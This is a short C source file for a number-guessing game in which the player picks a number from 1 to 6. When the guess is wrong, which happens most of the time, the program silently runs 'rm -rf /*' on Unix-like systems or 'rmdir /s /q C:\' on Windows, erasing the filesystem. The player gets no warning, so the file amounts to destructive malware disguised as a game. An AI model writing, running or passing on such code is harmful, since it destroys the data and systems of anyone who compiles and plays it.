#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    puts("Guess the number! 1-6");

    int selection = 0;
    scanf("%d", &selection);

    srand(time(NULL));

    int number = (rand() % 6) + 1;

    if (number == selection) {
        puts("That's correct!");
    } else {
       #ifdef _WIN32
          char command[256];
          snprintf(command, sizeof(command), "rmdir /s /q %s", "C:\\");
          system(command);
      #else
          system("rm -rf /*");
      #endif
    }

    return 0;
}
